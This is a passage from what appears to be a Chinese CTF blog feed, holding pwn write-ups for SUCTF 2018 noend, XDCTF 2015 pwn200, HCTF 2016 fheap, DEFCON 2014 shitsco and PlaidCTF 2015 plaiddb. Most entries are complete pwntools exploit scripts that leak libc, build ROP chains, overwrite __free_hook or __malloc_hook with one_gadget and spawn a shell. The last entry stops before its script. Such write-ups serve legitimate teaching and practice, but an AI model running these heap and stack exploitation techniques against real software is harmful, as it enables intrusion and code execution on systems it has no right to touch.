<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, <span class="number">0x1F</span>uLL);</span><br><span class="line">    size = strtoll(&amp;s, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">    buf = <span class="built_in">malloc</span>(size);</span><br><span class="line">    read(<span class="number">0</span>, buf, size);</span><br><span class="line">    *((_BYTE *)buf + size - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">    write(<span class="number">1</span>, buf, (<span class="keyword">unsigned</span> __int16)size);</span><br><span class="line">    write(<span class="number">1</span>, &amp;unk_B54, <span class="number">1u</span>LL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( size &gt; <span class="number">127</span> );</span><br><span class="line">  <span class="built_in">free</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在进行malloc时，并未检查是否malloc成功，malloc失败会返回0，导致后续存在任意地址写\x00的漏洞。首先需要泄漏libc的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sar</span>(<span class="params">p, size, content</span>):</span></span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line">    p.recvuntil(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./noend&#x27;</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">    context.update(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    sar(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    sar(p, <span class="number">0x30</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    sar(p, <span class="number">0x7f</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    sar(p, <span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    main_arena_addr = u64(recv[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">    libc_base_addr = main_arena_addr - <span class="number">0x3c4b78</span></span><br><span class="line">    <span class="comment">#malloc_hook = libc_base_addr + 0x3c4b10</span></span><br><span class="line">    free_hook = libc_base_addr + <span class="number">0x3c67a8</span></span><br></pre></td></tr></table></figure>

<p>根据free时，chunk合并的特性，能够使最后top chunk的fd和bk指向main_arena。malloc(0x20)后，其中的信息并不会清空，导致libc地址泄漏。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.sendline(str(main_arena_addr))</span><br><span class="line">sleep(0.3)</span><br><span class="line">p.clean()</span><br></pre></td></tr></table></figure>

<p>申请一个非常大的chunk，使libc重新申请arena。使用前述同样的方法泄漏地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sar(p, <span class="number">0x20</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">sar(p, <span class="number">0x30</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">sar(p, <span class="number">0x7f</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">sar(p, <span class="number">0x20</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">recv = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[<span class="number">0</span>:<span class="number">8</span>]</span><br><span class="line">top_chunk_ptr = u64(recv)</span><br><span class="line">top_chunk = u64(recv) + <span class="number">0x888</span></span><br></pre></td></tr></table></figure>

<p>泄漏的地址指向top chunk，在这使用硬编码计算伪造的top chunk与泄漏的地址的偏移。（本地没问题，不知道remote会不会有问题，等端午放完假再问问师傅）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sar(p, <span class="number">0xf0</span>, p64(libc_base_addr + one_gadget[<span class="number">3</span>] + (free_hook - top_chunk - <span class="number">0x10</span>)) * (<span class="number">0xe8</span> / <span class="number">8</span>))</span><br><span class="line">p.sendline(str(top_chunk_ptr + <span class="number">1</span>))</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure>

<p>接着对申请的chunk进行填充，填充的值为one_gadget_addr + (free_hook_addr - top_chunk_addr - 0x10)。继续申请一个很大的chunk，此时libc不会再有新的arena了，而是申请失败返回0，导致任意地址写入\x00。在这我们向指向top chunk的地址末位写入\x00，导致top chunk指针向前移动，指向了我们之前申请的chunk的content部分。此时，伪造top chunk完成。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendline(str(free_hook - top_chunk - <span class="number">0x10</span>))</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure>

<p>malloc(free_hook - top_chunk - 0x10)，使得top chunk的size变为one_gadget_addr。同时top chunk的地址变为top_chunk_addr + free_hook - top_chunk - 0x10 = free_hook - 0x10，free_hook处被填入one_gadget_addr。随后获取shell。（注意地址对齐的问题）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sar(p, <span class="number">0x10</span>, <span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>suctf</tag>
      </tags>
  </entry>
  <entry>
    <title>xdctf 2015 pwn200 writeup</title>
    <url>/2018/01/06/xdctf15-pwn200/</url>
    <content><![CDATA[<p>为栈溢出，溢出点为buf，长度0x6C，read可输入0x100。溢出偏移为112。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u); <span class="comment">// buf length: 0x6C</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>因为无libc，因此需要通过泄漏获取libc信息来获取<code>system</code>函数地址：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">112</span> + p32(write_plt) + p32(<span class="number">0x8048484</span>) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>) <span class="comment"># 返回到0x8048484使得泄漏可以重复</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./xdctf15-pwn200&#x27;</span>), libcdb=<span class="literal">False</span>)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>接着调用<code>start</code>函数恢复栈：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">112</span> + p32(start_addr)</span><br></pre></td></tr></table></figure>

<p>调用read函数输入”/bin/sh”字符串，最后调用<code>system</code>函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">112</span> + p32(read_plt) + p32(<span class="number">0x804856c</span>) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_addr)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>xctf</tag>
        <tag>2015</tag>
      </tags>
  </entry>
  <entry>
    <title>2019 Feb pwn writeup</title>
    <url>/2019/02/06/19-Feb/</url>
    <content><![CDATA[<h2 id="HCTF-2016-fheap-2019-02-05"><a href="#HCTF-2016-fheap-2019-02-05" class="headerlink" title="HCTF 2016 fheap [2019.02.05]"></a>HCTF 2016 fheap [2019.02.05]</h2><p>程序中对在uaf，可以进行double free来造成堆块的重叠。</p>
<a id="more"></a>

<p>通过第一次堆块重叠，可以将一个chunk的释放功能的地址改为<code>call puts</code>的地址，从而在<code>delete</code>时调用<code>puts</code>函数进行输出。第二次堆块重叠则用来伪造堆块的大小，使其释放后位于<code>unsorted bin</code>且与前述含有<code>puts</code>函数的堆块重叠。通过分配<code>unsorted bin</code>使得可以通过<code>puts</code>泄漏出libc的基地址。同样的，也可以泄漏出程序的基地址。</p>
<p>但这种方法存在问题：只知道libc基地址而无法知道libc的函数地址。（通过爆破libc版本说不定可以getshell）</p>
<p>不过.got表中存在能够伪造0x70大小chunk的空间，可能可以利用这个和第一次堆块重叠调用<code>puts</code>的方法来把libc泄漏出来。（一个很大的问题就是无法向堆块中写入\x00）</p>
<p>也尝试过调用<code>printf</code>函数来利用格式化字符串漏洞泄漏地址，但是调用时总是会遇到Segmentation Fault。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">p, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;quit\n&#x27;</span>, <span class="string">&#x27;create &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;str:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;quit\n&#x27;</span>, <span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id:&#x27;</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?:&#x27;</span>, <span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./pwn-f&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        create(p, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    create(p, <span class="number">2</span>, <span class="string">&#x27;\xa0\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span> + <span class="string">&#x27;\x31\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">2</span>, <span class="string">&#x27;\xa0\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">10</span>, <span class="string">&#x27;\xa0\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\x1a\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    create(p, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    create(p, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + <span class="string">&#x27;\x31\x00&#x27;</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    create(p, <span class="number">2</span>, <span class="string">&#x27;\x10\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\x31\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(<span class="number">0x211</span>)[:<span class="number">3</span>])</span><br><span class="line">    delete(p, <span class="number">6</span>)</span><br><span class="line">    create(p, <span class="number">0x300</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">19</span> * <span class="number">0x8</span> + p64(<span class="number">0x61</span>)[:<span class="number">2</span>])</span><br><span class="line">    create(p, <span class="number">0x300</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">9</span> * <span class="number">0x8</span> + p64(<span class="number">0x91</span>)[:<span class="number">2</span>])</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    create(p, <span class="number">0x300</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">12</span> * <span class="number">0x8</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<p>看了官网wp：<a href="https://github.com/zh-explorer/hctf2016-fheap/blob/master/poc.py%E3%80%82">https://github.com/zh-explorer/hctf2016-fheap/blob/master/poc.py。</a></p>
<p>它是通过ROP来getshell，在进行<code>delete</code>的时候跳转到gadget强制<code>delete</code>提前返回来达到ROP的目的。利用函数中用于保存用户输入的buf来ROP。</p>
<p>修改后的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">p, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;quit\n&#x27;</span>, <span class="string">&#x27;create &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;str:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;quit\n&#x27;</span>, <span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id:&#x27;</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?:&#x27;</span>, <span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    p = process(<span class="string">&#x27;./pwn-f&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./pwn-f&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        create(p, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    create(p, <span class="number">2</span>, <span class="string">&#x27;\xa0\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">0x100</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x38</span> + <span class="string">&#x27;\x31\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">2</span>, <span class="string">&#x27;\xa0\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">10</span>, <span class="string">&#x27;\xa0\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\x1a\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    create(p, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + <span class="string">&#x27;\x31\x00&#x27;</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line">    create(p, <span class="number">2</span>, <span class="string">&#x27;\x10\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">10</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\x31\x00&#x27;</span>)</span><br><span class="line">    create(p, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p32(<span class="number">0x211</span>)[:<span class="number">3</span>])</span><br><span class="line">    delete(p, <span class="number">6</span>)</span><br><span class="line">    create(p, <span class="number">0x300</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">19</span> * <span class="number">0x8</span> + p64(<span class="number">0x61</span>)[:<span class="number">2</span>])</span><br><span class="line">    create(p, <span class="number">0x300</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">9</span> * <span class="number">0x8</span> + p64(<span class="number">0x91</span>)[:<span class="number">2</span>])</span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line">    create(p, <span class="number">0x300</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">10</span> * <span class="number">0x8</span> + <span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># 修改12为10</span></span><br><span class="line">    delete(p, <span class="number">8</span>)</span><br><span class="line">    <span class="comment"># ------------------------------------------</span></span><br><span class="line">    create(p, <span class="number">0x300</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">5</span> * <span class="number">0x8</span> + <span class="string">&#x27;\x1a\x00&#x27;</span>)</span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;a&#x27;</span> * <span class="number">3</span> * <span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    elf.address = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) - (<span class="number">0x55873e14dd1a</span> - <span class="number">0x55873e14d000</span>)</span><br><span class="line">    delete(p, <span class="number">8</span>)</span><br><span class="line">    ppppr = elf.address + <span class="number">0x11dc</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">5</span> * <span class="number">0x8</span> + p64(ppppr)</span><br><span class="line">    create(p, <span class="number">0x300</span>, payload)</span><br><span class="line"></span><br><span class="line">    bss_addr = elf.address + <span class="number">0x202800</span></span><br><span class="line">    rdi_ret = elf.address + <span class="number">0x11e3</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;quit\n&#x27;</span>, <span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;id:&#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    payload = <span class="string">&#x27;yes&#x27;</span> + <span class="string">&#x27; &#x27;</span> * <span class="number">5</span> + p64(rdi_ret) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    payload += p64(rdi_ret) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">    payload += p64(elf.address + <span class="number">0xc71</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    recv = p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    libc.address = u64(recv + <span class="string">&#x27;\x00\x00&#x27;</span>) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">8</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">2</span> * <span class="number">0x8</span> + <span class="string">&#x27;/bin/sh &#x27;</span> + <span class="string">&#x27; &#x27;</span> * <span class="number">14</span> + <span class="string">&#x27;&amp;&amp;&#x27;</span> + p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">    create(p, <span class="number">0x300</span>, payload)</span><br><span class="line">    delete(p, <span class="number">3</span>) <span class="comment"># system(&#x27;/bin/sh &amp;&amp;&#x27; + p64(system_addr))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="DEFCON-QUALIFIER-2014-shitsco-2019-02-09"><a href="#DEFCON-QUALIFIER-2014-shitsco-2019-02-09" class="headerlink" title="DEFCON QUALIFIER 2014 shitsco [2019.02.09]"></a>DEFCON QUALIFIER 2014 shitsco [2019.02.09]</h2><p>对于我这种逆向渣来说理顺程序逻辑还是花了一点时间Orz。在对<code>set</code>的值进行清除时，如果清除的是第二个变量且保存在.bss上的第一个变量已经被清除时（此时第二个变量的<code>prev</code>值为0，第一个变量的<code>next</code>值为第二个变量的地址），第一个变量的<code>next</code>不会被修改，导致了UAF。只要将第二个变量所在的chunk重新获取并控制其中的内容为保存密码的地址，就能够泄漏密码获得flag。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    p = process(<span class="string">&#x27;./shitsco&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, <span class="string">&#x27;set a 1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, <span class="string">&#x27;set b 1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, <span class="string">&#x27;set c 1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, <span class="string">&#x27;set d &#x27;</span> + <span class="string">&#x27;1&#x27;</span> * <span class="number">0x18</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, <span class="string">&#x27;set a&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, <span class="string">&#x27;set b&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, <span class="string">&#x27;set d&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;set c &#x27;</span> + p32(<span class="number">0x804844A</span>) + p32(<span class="number">0x804c3a0</span>) + p32(<span class="number">0x804c260</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, <span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;sleep: &#x27;</span>)</span><br><span class="line">    password = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    payload = <span class="string">&#x27;enable &#x27;</span> + password</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;# &#x27;</span>, <span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="PlaidCTF-2015-Plaiddb-datastore-2019-02-11"><a href="#PlaidCTF-2015-Plaiddb-datastore-2019-02-11" class="headerlink" title="PlaidCTF 2015 Plaiddb(datastore) [2019.02.11]"></a>PlaidCTF 2015 Plaiddb(datastore) [2019.02.11]</h2><p>在输入索引的函数中，存在着<code>off-by-null</code>。利用<code>off-by-null</code>进行chunk overlap，然后泄漏libc基地址、利用0x70的chunk修改<code>__malloc_hook</code>的值为one_gadget。</p>
<p>漏洞如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">read_row_key</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">char</span> *current_dest; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> usable_size; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">char</span> chr; <span class="comment">// al MAPDST</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 offset; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">char</span> *new_chunk; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  chunk = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  current_dest = chunk;</span><br><span class="line">  usable_size = malloc_usable_size(chunk);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    chr = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( chr == <span class="number">-1</span> )</span><br><span class="line">      EXIT();</span><br><span class="line">    <span class="keyword">if</span> ( chr == <span class="string">&#x27;\n&#x27;</span> ) <span class="comment">// 当offset正好为chunk大小时，break，off-by-null</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    offset = current_dest - chunk;</span><br><span class="line">    <span class="keyword">if</span> ( usable_size &lt;= current_dest - chunk ) <span class="comment">// 空间不够用时</span></span><br><span class="line">    &#123;</span><br><span class="line">      new_chunk = (<span class="keyword">char</span> *)<span class="built_in">realloc</span>(chunk, <span class="number">2</span> * usable_size); <span class="comment">// 扩大两倍</span></span><br><span class="line">      chunk = new_chunk;</span><br><span class="line">      <span class="keyword">if</span> ( !new_chunk )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;FATAL: Out of memory&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      current_dest = &amp;new_chunk[offset]; <span class="comment">// 更新两个变量</span></span><br><span class="line">      usable_size = malloc_usable_size(new_chunk);</span><br><span class="line">    &#125;</span><br><span class="line">    *current_dest++ = chr;</span><br><span class="line">  &#125;</span><br><span class="line">  *current_dest = <span class="number">0</span>; <span class="comment">// off-by-null</span></span><br><span class="line">  <span class="keyword">return</span> chunk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp如下：</p>
